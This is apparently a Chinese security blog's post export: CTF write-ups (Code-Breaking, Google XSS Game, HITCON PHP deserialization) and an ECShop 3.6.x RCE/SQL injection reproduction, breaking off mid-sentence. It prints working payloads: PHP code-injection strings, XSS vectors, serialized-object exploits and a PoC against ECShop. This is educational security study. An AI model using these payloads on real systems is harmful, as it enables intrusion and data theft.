{"pages":[{"title":"","text":"CUIT 在读 Wechat: U2VjLU1pbgo== D0g3 道格安全研究实验室成员 Tencent 安全专家咨询中心（实习）2020.04-2021.1","link":"/about/index.html"},{"title":"分类 ~","text":"","link":"/categories/index.html"},{"title":"友情链接","text":"D0g3 team P1g3: http://payloads.info/ Threezh1: https://threezh1.com/ Loong716: https://loong716.top/ More D0g3er: https://www.d0g3.cn/about 其他小伙伴 离怀秋: https://lihuaiqiu.github.io/ Decade: https://wulidecade.cn/","link":"/link/index.html"},{"title":"search","text":"","link":"/search/index.html"},{"title":"标签 ~","text":"","link":"/tags/index.html"}],"posts":[{"title":"360网络安全职业认证 - CSSJ","text":"学校这边政策是大二之前可以免费考试。含金量未知，留个纪念。","link":"/2019/12/07/360%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%AF%81%E4%B9%A6/"},{"title":"Code-Breaking Puzzles 2018","text":"P牛在 2018 年出的题目，看了很多文章，对其涉及到的知识进行小结和补充。 题目地址：https://code-breaking.com/ easy-function代码审计题，直接给了题目源码 &lt;?php$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) { show_source(__FILE__);} else { $action(&apos;&apos;, $arg);} 首先是出现了一个不常见的 三元运算符 。查阅手册为 PHP7 新推出的表达式.简单概述应该就是 isset() + 三元表达式的结合体 大意是让我们通过 GET 型传两个参数 题目通过正则进行过滤 preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)，要求不能完全由数字字母下划线组成 /i 不区分大小写/s 匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[ \\f\\n\\r\\t\\v]/D 如果使用$限制结尾字符,则不允许结尾有换行 之后使用嵌套的方式 $action(&apos;&apos;, $arg); 执行传入的参数。熟悉命令执行的话不难想到 create_function 创建匿名函数来执行命令。 通常情况下 create_function 进行 RCE 的过程如下，其实是需要调用一次函数的。 trick：P牛圈子中： https://t.zsxq.com/VRfqRFe。 创建匿名函数的过程中闭合，从而达到 RCE 如果可控在第一个参数，需要闭合圆括号和大括号：create_function(‘){}phpinfo();//‘, ‘’); 如果可控在第二个参数，需要闭合大括号：create_function(‘’, ‘}phpinfo();//‘); create_function(&apos;$a,$b&apos;,&apos;return 111;}phpinfo();//&apos;)==&gt;function a($a, $b){ return 111;}phpinfo();//} 根据题目，第二个参数可控，因此闭合大括号 return &quot;P2hm1n&quot;;}phpinfo();/* 来执行代码。 随后是 Bypass 正则。回顾正则要求我们不能完全由数字字母下划线组成。首先/D如果使用$限制结尾字符,则不允许结尾有换行，那么尝试一下在开头插入换行符。 可以bypass正则，但是不能执行命令，如果想既能 bypass 正则又能执行命令，那么就要了解 php 的 命名空间命名空间概述 p牛有如下总结 php里默认命名空间是\\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法 最后找flag的位置进行读取即可，首先找flag位置更改命令 最后读取文件 * ?action=\\create_function&amp;arg=;}eval($_GET[&apos;cmd&apos;]);/*&amp;cmd=var_dump(file_get_contents(&apos;../flag_h0w2execute_arb1trary_c0de&apos;)); easy - pcrewaf首先是正则知识点回顾 元字符 元字符 描述 . 句号匹配任意单个字符除了换行符。 [ ] 字符种类。匹配方括号内的任意字符。 [^ ] 否定的字符种类。匹配除了方括号里的任意字符 * 匹配&gt;=0个重复的在*号之前的字符。 + 匹配&gt;=1个重复的+号前的字符。 ? 标记?之前的字符为可选. {n,m} 匹配num个大括号之间的字符 (n &lt;= num &lt;= m). (xyz) 字符集，匹配与 xyz 完全相等的字符串. 竖线 或运算符，匹配符号前或后的字符. \\ 转义字符,用于匹配一些保留的字符 [ ] ( ) { } . * + ? ^ $ \\ 竖线 ^ 从开始行开始匹配. $ 从末端开始匹配. .是元字符中最简单的例子。 .匹配任意单个字符，但不匹配换行符。 例如，表达式.ar匹配一个任意字符后面跟着是a和r的字符串。 方括号的句号就表示句号。 表达式 ar[.] 匹配 ar.字符串 简写字符集 简写 描述 . 除换行符外的所有字符 \\w 匹配所有字母数字，等同于 [a-zA-Z0-9_] \\W 匹配所有非字母数字，即符号，等同于： [^\\w] \\d 匹配数字： [0-9] \\D 匹配非数字： [^\\d] \\s 匹配所有空格字符，等同于： [\\t\\n\\f\\r\\p{Z}] \\S 匹配所有非空格字符： [^\\s] \\f 匹配一个换页符 \\n 匹配一个换行符 \\r 匹配一个回车符 \\t 匹配一个制表符 \\v 匹配一个垂直制表符 \\p 匹配 CR/LF（等同于 \\r\\n），用来匹配 DOS 行终止符 核心考点： p牛专门写了一篇文章来讲解：PHP利用PCRE回溯次数限制绕过某些安全限制 PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit easy - phplimit通过正则表达式进行过滤：preg_replace(&apos;/[^\\W]+\\((?R)?\\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;]) 正则表达式分析[^\\W] 等价 \\w 匹配括号\\( ... \\) 而 (?R) 则是 DEELX 正则表达式扩展语法 中的递归表达式 ， 表示递归引用整个模式(?R)? php递归模式：https://www.php.net/manual/zh/regexp.reference.recursive.php 综上所述：我们输入的code的值只能为 fuc1(func2(func3(…))) 这种类型。 不能加参数,否则经过正则替换之后 无法与 ; 进行强等于比较 法一： Apache函数 php 中 apache 手册: https://www.php.net/manual/zh/book.apache.phpApache下 可以使用的函数 getallheaders()file_get_contents(array_pop(apache_request_headers())) apache环境下进行测试先使用 var_dump()、 getallheaders() 成功返回了http header，我们可以在header中做一些自定义的手段。 翻数组的手册: https://www.php.net/manual/zh/ref.array.php 那么可以进一步利用http header的 自定义属性进行rce 法二： session_id() session_id() 可以用来获取/设置当前会话 ID。 限制文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号 突破：16进制转换 eval(hex2bin(session_id())); 即可执行任意命令 payload import requestsurl = &apos;http://39.96.13.114:8084/index.php?code=eval(hex2bin(session_id(session_start())));&apos;payload = &quot;var_dump(scandir(&apos;./&apos;));&quot;.encode(&apos;hex&apos;)cookies = { &apos;PHPSESSID&apos;:payload}r = requests.get(url=url,cookies=cookies)print(r.content) 法三: get_defined_vars() 此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。 $_GET$_POST$_FILES$_COOKIE 我们这里的选择也就具有多样性，可以利用$_GET进行RCE ?code=eval(end(current(get_defined_vars())));&amp;a=phpinfo(); 法四： 各种函数嵌套 readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); 函数解释 getchwd() 函数返回当前工作目录。scandir() 函数返回指定目录中的文件和目录的数组。dirname() 函数返回路径中的目录部分。chdir() 函数改变当前的目录。readfile() 输出一个文件current() 返回数组中的当前单元, 默认取第一个值pos() current() 的别名next() 函数将内部指针指向数组中的下一个元素，并输出。end() 将内部指针指向数组中的最后一个元素，并输出。array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。chr() 函数从指定的 ASCII 值返回字符。hex2bin — 转换十六进制字符串为二进制字符串getenv() 获取一个环境变量的值(在7.1之后可以不给予参数) easy - nodechr源码在 /source ，node.js 的题目 没有深入学习过 node.js 但是代码好歹还是通俗易懂 async function login(ctx, next) { if(ctx.method == &apos;POST&apos;) { let username = safeKeyword(ctx.request.body[&apos;username&apos;]) let password = safeKeyword(ctx.request.body[&apos;password&apos;]) let jump = ctx.router.url(&apos;login&apos;) if (username &amp;&amp; password) { let user = await ctx.db.get(`SELECT * FROM &quot;users&quot; WHERE &quot;username&quot; = &apos;${username.toUpperCase()}&apos; AND &quot;password&quot; = &apos;${password.toUpperCase()}&apos;`) if (user) { ctx.session.user = user jump = ctx.router.url(&apos;admin&apos;) } } 直接定位 sql语句相关代码，username 和 password 在插入数据库执行之前经过一个 safeKeyword 函数处理。跟进函数定义 function safeKeyword(keyword) { if(isString(keyword) &amp;&amp; !keyword.match(/(union|select|;|\\-\\-)/is)) { return keyword } return undefined} 函数过滤了 union 、 select 、; 、--。 相应的 trick 在 p牛 的blog Fuzz中的javascript大小写特性 &quot;unıon&quot;.toUpperCase() == &quot;UNION&quot;&quot;ſelect&quot;.toUpperCase() == &quot;SELECT&quot; 参考文章 https://skysec.top/https://xz.aliyun.com/t/3623","link":"/2019/12/28/Code-Breaking-Puzzles-2018/"},{"title":"ECShop 3.6.x RCE 到 4.0 SQLi 漏洞分析","text":"一个从 Nday 到 0day 的漏洞，对此进行复现分析和学习 两年前一个利用很巧妙的全版本的 RCE 的漏洞，近日笔者又看到了 4.0 版本的 SQL 注入漏洞分析。希望能从复现分析的过程中获得一点漏洞挖掘的思路和启示。 3.6.x RCE漏洞复现Vulhub上已经有现成的利用脚本 &lt;?php$shell = bin2hex(&quot;{\\$asd&apos;];phpinfo\\t();//}xxx&quot;);$id = &quot;-1&apos; UNION/*&quot;;$arr = [ &quot;num&quot; =&gt; sprintf(&apos;*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -&apos;, bin2hex($id), $shell), &quot;id&quot; =&gt; $id];$s = serialize($arr);$hash3 = &apos;45ea207d7a2b68c49582d2d22adf953a&apos;;$hash2 = &apos;554fcae493e564ee0dc75bdf2ebf94ca&apos;;echo &quot;POC for ECShop 2.x: \\n&quot;;echo &quot;{$hash2}ads|{$s}{$hash2}&quot;;echo &quot;\\n\\nPOC for ECShop 3.x: \\n&quot;;echo &quot;{$hash3}ads|{$s}{$hash3}&quot;; 漏洞分析触发流程定位触发点 /user.php： 对 $back_act 附值， 其实这个地方相当于 Referer 字段不包含 user.php 的前提下能达到 $back_act 的变量可控 变量传递 跟进，这里进行了变量注册。将 $back_act 注册成了 $this-&gt;_var[$tpl_var] 下面跟进 display ，/includes/cls_template.php 为模版类， display 为页面显示函数 跟进 fetch，主要为模版处理文件。处理的 filename 为 user_passport.dwt 其中这里会触发编译模版函数 跟进make_compiled , 会返回处理好的 hmtl 内容。然后附值给 out 之后会返回 display 函数继续处理未处理的流程，strpos 判断这里是至关重要的一点，涉及到了之后需要调用的 insert_mod 。 $this-&gt;_echash 是之前 /includes/cls_template.php 定义好的 var $_echash = &apos;45ea207d7a2b68c49582d2d22adf953a&apos;; 然后进行 foreach 循环执行 insert_mod 这里 if (($key % 2) == 1) 的作用看一下被切割的 k 就知道了 跟进 insert_mod， 主要完成这几件事儿： 用 | 分割变量 反序列化 para fun 变量的拼接 返回 $fun($para) 根据返回值引发思考， 我们目前得到的返回值是：$fun($para) $fun($para) 的 fun 来自 insert_ + 被 explode 的前半部分 para 来自被 explode 的后半部分 那么漏洞利用思路就是执行拼接了 insert_ 的可控函数 问题剖析 问题一 首先是 $back_act 附值方式，为什么采用 Referer 头传入？ 其实还有很多其他附值方法： emample:$back_act = isset($_POST[&apos;back_act&apos;]) ? trim($_POST[&apos;back_act&apos;]) : &apos;&apos;; 究其核心原因： /includes/init.php addslashes_deep 问题二 为什么字符串是序列化字符串？ /includes/cls_template.php#insert_mod 先分割，再反序列化 问题三 如何bypass 主要过滤 function smarty_prefilter_preCompile($source){ ··· $pattern = array( &apos;/&lt;!--[^&gt;|\\n]*?({.+?})[^&lt;|{|\\n]*?--&gt;/&apos;, // 替换smarty注释 &apos;/&lt;!--[^&lt;|&gt;|{|\\n]*?--&gt;/&apos;, // 替换不换行的html注释 &apos;/(href=[&quot;|\\&apos;])\\.\\.\\/(.*?)([&quot;|\\&apos;])/i&apos;, // 替换相对链接 &apos;/((?:background|src)\\s*=\\s*[&quot;|\\&apos;])(?:\\.\\/|\\.\\.\\/)?(images\\/.*?[&quot;|\\&apos;])/is&apos;, // 在images前加上 $tmp_dir &apos;/((?:background|background-image):\\s*?url\\()(?:\\.\\/|\\.\\.\\/)?(images\\/)/is&apos;, // 在images前加上 $tmp_dir &apos;/([\\&apos;|&quot;])\\.\\.\\//is&apos;, // 以../开头的路径全部修正为空 ); $replace = array( &apos;\\1&apos;, &apos;&apos;, &apos;\\1\\2\\3&apos;, &apos;\\1&apos; . $tmp_dir . &apos;\\2&apos;, &apos;\\1&apos; . $tmp_dir . &apos;\\2&apos;, &apos;\\1&apos; ); return preg_replace($pattern, $replace, $source); } SQLi（云复现）3.x版本引入了 /includes/safety.php 进行过滤。所以 3.x 版本 理论上是不存在 SQL 注入的 但是为了学习思路，还是云复现一下这个 2.x 版本可以利用的漏洞。 之前分析到寻找可控函数进行调用。网上用的都是 insert_ads 这个函数 关于 SQL 注入的利用思考可以参考这篇文章：https://xz.aliyun.com/t/2725 注释掉了 waf 相关的函数（绕不过去），payload 如下 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:&quot;num&quot;;s:3:&quot;669&quot;;s:2:&quot;id&quot;;s:57:&quot;1&apos; and updatexml(1,make_set(3,&apos;~&apos;,(select version())),1)#&quot;;} 执行的相应 SQL 语句： SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() AS rnd FROM `ecshop360`.`ecs_ad` AS a LEFT JOIN `ecshop360`.`ecs_ad_position` AS p ON a.position_id = p.position_id WHERE enabled = 1 AND start_time &lt;= &apos;1606229787&apos; AND end_time &gt;= &apos;1606229787&apos; AND a.position_id = &apos;1&apos; and updatexml(1,make_set(3,&apos;~&apos;,(select version())),1)#&apos; ORDER BY rnd LIMIT 669 RCE回顾 /includes/lib_insert.php#insert_ads function insert_ads($arr){ static $static_res = NULL; $time = gmtime(); if (!empty($arr[&apos;num&apos;]) &amp;&amp; $arr[&apos;num&apos;] != 1) { $sql = &apos;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &apos; . &apos;p.ad_height, p.position_style, RAND() AS rnd &apos; . &apos;FROM &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad&apos;) . &apos; AS a &apos;. &apos;LEFT JOIN &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad_position&apos;) . &apos; AS p ON a.position_id = p.position_id &apos; . &quot;WHERE enabled = 1 AND start_time &lt;= &apos;&quot; . $time . &quot;&apos; AND end_time &gt;= &apos;&quot; . $time . &quot;&apos; &quot;. &quot;AND a.position_id = &apos;&quot; . $arr[&apos;id&apos;] . &quot;&apos; &quot; . &apos;ORDER BY rnd LIMIT &apos; . $arr[&apos;num&apos;]; $res = $GLOBALS[&apos;db&apos;]-&gt;GetAll($sql); } $ads = array(); $position_style = &apos;&apos;; foreach ($res AS $row) { if ($row[&apos;position_id&apos;] != $arr[&apos;id&apos;]) { continue; } ········ $position_style = &apos;str:&apos; . $position_style; $need_cache = $GLOBALS[&apos;smarty&apos;]-&gt;caching; $GLOBALS[&apos;smarty&apos;]-&gt;caching = false; $GLOBALS[&apos;smarty&apos;]-&gt;assign(&apos;ads&apos;, $ads); $val = $GLOBALS[&apos;smarty&apos;]-&gt;fetch($position_style); $GLOBALS[&apos;smarty&apos;]-&gt;caching = $need_cache; return $val;} 在这一步关键的附值，$row[&apos;position_style&apos;] 来自$res = $GLOBALS[&apos;db&apos;]-&gt;GetAll($sql) 查询后 foreach 遍历的结果。有几个关注的点： 首先关注 $position_style 这个变量 关注 $row[&apos;position_id&apos;] != $arr[&apos;id&apos;] （相等调用 $position_style = $row[&apos;position_style&apos;];） 在下面完成拼接 会调用 fetch /includes/cls_template.php 145 行是一个关键点。无非两个函数： fetch_str _eval 肯定首先得 fetch_str 处理截断后的 filename ，也就是{$asd&apos;];phpinfo\\t();//}xxx 后面经过一顿操作，各种替换之后，原来的值变成了 $asd&apos;];phpinfo\\t();// 进入 select 函数，关键点如下。返回值是直接 php echo 出来的 后面的过程在第一次分析的时候是懵逼的，其实是缺乏了对前面 SQL 语句的大局观，而且流程很杂，各种 replace 的替换和各种 if。 @badcode 从宏观上总结的 SQL 语句和最后 position_style 的关系已经很简洁了。我这里不再复述 接下来就是把构造好的代码通过SQL注入漏洞传给$position_style。 这里可以用union select 来控制查询的结果，根据之前的流程，$row[&apos;position_id&apos;]和$arr[&apos;id&apos;]要相等，$row[&apos;position_id&apos;]是第二列的结果，$position_style是第九列的结果。$arr[&apos;id&apos;]传入&apos; /*,$arr[&apos;num&apos;]传入*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -，0x27202f2a是&apos; /*的16进制值，也就是$row[&apos;position_id&apos;]的值，0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d是上面构造的php代码的16进制值，也就是$position_style。 get_var 中会调用 make_var，最后返回值 论 $position_style 的演变 {$asd&apos;];phpinfo\\t();//}xxx$res = $static_res[$arr[&apos;id&apos;]]; -&gt; foreach ($res AS $row) -&gt; $position_style = $row[&apos;position_style&apos;];str:{$asd&apos;];phpinfo\\t();//}xxx$position_style = &apos;str:&apos; . $position_style; $asd&apos;];phpinfo\\t();//}xxxreturn preg_replace_callback(&quot;/{([^\\}\\{\\n]*)}/&quot;, function($r) use(&amp;$template){return $template-&gt;select($r[1]);}, $source);asd&apos;];phpinfo\\t();//elseif ($tag{0} == &apos;$&apos;){return &apos;&lt;?php echo &apos; . $this-&gt;get_val(substr($tag, 1)) . &apos;; ?&gt;&apos;;} $this-&gt;_var[&apos;asd&apos;];phpinfo\\t();//&apos;]foreach ($t AS $val) { $p.= &apos;[\\&apos;&apos; . $val . &apos;\\&apos;]&apos;; } 最后输出 phpinfo() 4.0 SQLi没找到安装包233333…先咕咕咕了～～～ https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw http://foreversong.cn/archives/1556 参考链接https://paper.seebug.org/695/","link":"/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"},{"title":"Google XSS Game","text":"题目地址：https://xss-game.appspot.com 刷完了题会发现，其实这个 XSS小练习 并没有通过很严格的过滤来考察 XSS 的一些 Bypass 手段和不同浏览器的一些特性。但它通过六道题基本概括了一些 XSS 的类型和常见的触发点以及触发方式。其实还是有很多地方值得我们深思。 Level 1: Hello, world of XSSXSS类型：Reflected XSS 过滤情况：无过滤 影响范围： 点击恶意链接的用户 触发XSS位置： 搜索框 payload： &lt;script&gt;alert(&apos;P2hm1n&apos;)&lt;/script&gt; Level 2: Persistence is keyXSS类型：Stored XSS 过滤情况：过滤 &lt;script&gt; 标签 Bypass： 利用其他标签 影响范围： 所有能看见帖子的用户 触发XSS位置：留言板扩展思路：发送帖子等存储位置 payload： &lt;img src=x onerror=alert(&apos;P2hm1n&apos;)&gt; Level 3: That sinking feeling…XSS类型：DOM XSS 过滤情况：无过滤 影响范围： 点击恶意链接的用户 触发XSS位置：选择浏览图片处扩展思路：通过 JS 选择图片 简单分析如下 漏洞代码： var html = &quot;Image &quot; + parseInt(num) + &quot;&lt;br&gt;&quot;;html += &quot;&lt;img src=&apos;/static/level3/cloud&quot; + num + &quot;.jpg&apos; /&gt;&quot;;$(&apos;#tabContent&apos;).html(html);window.location.hash = num; 如果不看代码盲测会发现 # 后面的东西都会被闭合到 &lt;img src=&quot;&quot;&gt; 里面的 src 属性中。想要逃逸出来的话只能添加 &apos; 一个单引号，来闭合前面的语句逃逸单引号之后，利用事件弹窗，或者闭合之前标签。均可触发 XSS payload1： 1&apos; onerror=alert(&apos;P2hm1n&apos;) &apos;payload2： 1&apos; &lt;img src=x onerror=alert(&apos;P2hm1n&apos;)&gt;&lt; Level 4: Context mattersXSS类型：DOM XSS 过滤情况：过滤分号 Bypass： 利用 URL 编码 影响范围： 点击恶意链接的用户 触发XSS位置：计时器；扩展思路：所有可能自定义JS函数的位置 简单分析如下自定义了一个JS函数，前端输入的值类似一个计时器。到了响应的秒数会提示到时间了。输入的数字会进入 JS 函数的变量。为了方便进行代码分析，将输入的数字调大，输入 123 相应 JS 输出位置 &lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&apos;123&apos;);&quot;&gt;核心思路：1. 闭合 (&apos; 2. 利用分号 3. 利用 || payload1: 123&apos;) || alert(&apos;P2hm1npayload2: 1&apos;)%3Balert(&apos;P2hm1n Level 5: Breaking protocolXSS类型：Reflected XSS 过滤情况：无过滤 影响范围： 点击恶意链接的用户 触发XSS位置：注册用户扩展思路：所有链接跳转位置 简单分析如下首页没有可以和用户交互的点，点击 Sign up 跳转至注册页面。观察 URL 为 https://xss-game.appspot.com/level5/frame/signup?next=confirm查找 confirm 响应 JS 输出位置 &lt;a href=&quot;confirm&quot;&gt;直接利用 JS 伪协议 payload： javascript:alert(&apos;P2hm1n&apos;) Level 6: Follow the 这类 XSS 是我在之前没有遇到过的。一开始盲测时也没有思路 题目中的任务说明告诉我们这里采用动态加载 JS 的方式 这题看了一个歪果仁的 writeup: XSS-game by Google exercises 4, 5 and 6 第一个 payload 是直接利用 DATA URI Scheme 来执行 js 代码第二个 payload 是利用的 google 的一个 api 来调用 js 代码 payload1: data:text/javascript,alert(1);payload2: www.google.com/jsapi?callback=alert","link":"/2019/03/27/Google-XSS-Game/"},{"title":"HITCON三题递进PHP反序列化","text":"HITCON三道关于反序列化的题目 @zsx师傅blog几句话吸引了我的兴趣。 HITCON 2016上，出了一道PHP反序列化。HITCON 2017上，出了一道Phar + PHP反序列化。HITCON 2018上，出了一道file_get_contents + Phar + PHP反序列化。 HITCON 2016 babytrick网上没找到题目复现的docker环境，所以直接去 Github 上找的源码，对题目理解可能有失偏颇，敬请谅解。 题目代码如下 &lt;?phpinclude &quot;config.php&quot;;class HITCON{ private $method; private $args; private $conn; public function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; $this-&gt;__conn(); } function show() { list($username) = func_get_args(); $sql = sprintf(&quot;SELECT * FROM users WHERE username=&apos;%s&apos;&quot;, $username); $obj = $this-&gt;__query($sql); if ( $obj != false ) { $this-&gt;__die( sprintf(&quot;%s is %s&quot;, $obj-&gt;username, $obj-&gt;role) ); } else { $this-&gt;__die(&quot;Nobody Nobody But You!&quot;); } } function login() { global $FLAG; list($username, $password) = func_get_args(); $username = strtolower(trim(mysql_escape_string($username))); $password = strtolower(trim(mysql_escape_string($password))); $sql = sprintf(&quot;SELECT * FROM users WHERE username=&apos;%s&apos; AND password=&apos;%s&apos;&quot;, $username, $password); if ( $username == &apos;orange&apos; || stripos($sql, &apos;orange&apos;) != false ) { $this-&gt;__die(&quot;Orange is so shy. He do not want to see you.&quot;); } $obj = $this-&gt;__query($sql); if ( $obj != false &amp;&amp; $obj-&gt;role == &apos;admin&apos; ) { $this-&gt;__die(&quot;Hi, Orange! Here is your flag: &quot; . $FLAG); } else { $this-&gt;__die(&quot;Admin only!&quot;); } } function source() { highlight_file(__FILE__); } function __conn() { global $db_host, $db_name, $db_user, $db_pass, $DEBUG; if (!$this-&gt;conn) $this-&gt;conn = mysql_connect($db_host, $db_user, $db_pass); mysql_select_db($db_name, $this-&gt;conn); if ($DEBUG) { $sql = &quot;CREATE TABLE IF NOT EXISTS users ( username VARCHAR(64), password VARCHAR(64), role VARCHAR(64) ) CHARACTER SET utf8&quot;; $this-&gt;__query($sql, $back=false); $sql = &quot;INSERT INTO users VALUES (&apos;orange&apos;, &apos;$db_pass&apos;, &apos;admin&apos;), (&apos;phddaa&apos;, &apos;ddaa&apos;, &apos;user&apos;)&quot;; $this-&gt;__query($sql, $back=false); } mysql_query(&quot;SET names utf8&quot;); mysql_query(&quot;SET sql_mode = &apos;strict_all_tables&apos;&quot;); } function __query($sql, $back=true) { $result = @mysql_query($sql); if ($back) { return @mysql_fetch_object($result); } } function __die($msg) { $this-&gt;__close(); header(&quot;Content-Type: application/json&quot;); die( json_encode( array(&quot;msg&quot;=&gt; $msg) ) ); } function __close() { mysql_close($this-&gt;conn); } function __destruct() { $this-&gt;__conn(); if (in_array($this-&gt;method, array(&quot;show&quot;, &quot;login&quot;, &quot;source&quot;))) { @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } else { $this-&gt;__die(&quot;What do you do?&quot;); } $this-&gt;__close(); } function __wakeup() { foreach($this-&gt;args as $k =&gt; $v) { $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v))); } }}if(isset($_GET[&quot;data&quot;])) { @unserialize($_GET[&quot;data&quot;]); } else { new HITCON(&quot;source&quot;, array());} 漏洞代码核心: @unserialize($_GET[&quot;data&quot;]); 代码的全局过滤如下，主要过滤函数为 mysql_escape_stringfunction __wakeup() { foreach($this-&gt;args as $k =&gt; $v) { $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v))); }}关于此魔术方法的绕过为 CVE-2016-7124 代码中参数附值主要靠 call_user_func_array(),list(),func_get_args()三个函数共同作用。 首先 show 方法中动态拼接sql语句采取了 sprintf 函数。但其对单引号等敏感字符并没有转义功能，又因为我们可利用CVE-2016-7124 来绕过全局过滤。因此此处存在sql注入。 通过sql注入获得orange密码 &lt;?phpclass HITCON{ private $method=&quot;show&quot;; private $args=array(&quot;&apos; union select password,1,1 from users where username = &apos;orange&apos;#&quot;); private $conn=1;}$payload1 = new HITCON();echo urlencode(serialize($payload1));?&gt; 通过上述步骤得知 orange 的密码是 babytrick1234 接着进入 login 方法，这里通过用户名跟密码可以得到 flag。但其方法里一处限制如下 if ( $username == &apos;orange&apos; || stripos($sql, &apos;orange&apos;) != false ) { $this-&gt;__die(&quot;Orange is so shy. He do not want to see you.&quot;);} Bypass的点为 mysql的编码设置安全 猪猪侠在微博上曾经说过 MYSQL 中 utf8_unicode_ci和utf8_general_ci两种编码格式,utf8_general_ci不区分大小写,Ä = A, Ö = O, Ü = U这三种条件都成立,对于utf8_general_ci下面的等式成立：ß=s,但是，对于utf8_unicode_ci下面等式才成立：ß = ss 本地使用 DVWA 的库进行测试 因此通过替换关键字符，构造最终payload如下 &lt;?phpclass HITCON{ private $method; private $args; private $conn; public function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; }}$args[&apos;username&apos;] = &apos;ORÄNGE&apos;;$args[&apos;password&apos;] = &apos;babytrick1234&apos;;$data = new HITCON(&apos;login&apos;,$args);echo urlencode(serialize($data));?&gt; HITCON 2017 Baby-Master-PHP题目采用 i春秋 平台进行复现。其实本来最开始复现采用的是buu，但是buu的平台加载不了我服务器上的phar文件。后来就换了 题目源码 &lt;?php$FLAG = create_function(&quot;&quot;, &apos;die(`/read_flag`);&apos;);$SECRET = `/read_secret`;$SANDBOX = &quot;/var/www/data/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);@mkdir($SANDBOX);@chdir($SANDBOX);if (!isset($_COOKIE[&quot;session-data&quot;])) { $data = serialize(new User($SANDBOX)); $hmac = hash_hmac(&quot;sha1&quot;, $data, $SECRET); setcookie(&quot;session-data&quot;, sprintf(&quot;%s-----%s&quot;, $data, $hmac));}class User { public $avatar; function __construct($path) { $this-&gt;avatar = $path; }}class Admin extends User { function __destruct() { $random = bin2hex(openssl_random_pseudo_bytes(32)); eval(&quot;function my_function_$random() {&quot; . &quot; global \\$FLAG; \\$FLAG();&quot; . &quot;}&quot;); $_GET[&quot;lucky&quot;](); }}function check_session() { global $SECRET; $data = $_COOKIE[&quot;session-data&quot;]; list($data, $hmac) = explode(&quot;-----&quot;, $data, 2); if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)) { die(&quot;Bye&quot;); } if (!hash_equals(hash_hmac(&quot;sha1&quot;, $data, $SECRET), $hmac)) { die(&quot;Bye Bye&quot;); } $data = unserialize($data); if (!isset($data-&gt;avatar)) { die(&quot;Bye Bye Bye&quot;); } return $data-&gt;avatar;}function upload($path) { $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;); if (substr($data, 0, 6) !== &quot;GIF89a&quot;) { die(&quot;Fuck off&quot;); } file_put_contents($path . &quot;/avatar.gif&quot;, $data); die(&quot;Upload OK&quot;);}function show($path) { if (!file_exists($path . &quot;/avatar.gif&quot;)) { $path = &quot;/var/www/html&quot;; } header(&quot;Content-Type: image/gif&quot;); die(file_get_contents($path . &quot;/avatar.gif&quot;));}$mode = $_GET[&quot;m&quot;];if ($mode == &quot;upload&quot;) { upload(check_session());} else if ($mode == &quot;show&quot;) { show(check_session());} else { echo &quot;IP:&quot;.$_SERVER[&quot;REMOTE_ADDR&quot;]; echo &quot;Sandbox:&quot;.&quot;/var/www/data/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); highlight_file(__FILE__);} 上来第一行就是一个姿势点orz$FLAG = create_function(&quot;&quot;, &apos;die(/read_flag);&apos;);。根据php源码 匿名函数会被设置为\\x00lambda_%d ，其中 %d 为数字，取决于进程中匿名函数的个数，但是我们每访问一次题目，就会生成一个匿名函数，这样匿名函数的名字就不可控。这里需要参考: Apache 工作的三种模式：Prefork、Worker、Event可以通过大量的请求来迫使Pre-fork模式启动的Apache启动新的线程，这样这里的%d会刷新为1，就可以预测了。 Apache-prefork模型(默认模型)在接受请求后会如何处理,首先Apache会默认生成5个child server去等待用户连接, 默认最高可生成256个child server, 这时候如果用户大量请求, Apache就会在处理完MaxRequestsPerChild个tcp连接后kill掉这个进程,开启一个新进程处理请求。 随后代码初始化了用户沙箱。 题目中干扰最大的是check_session 函数。check_session 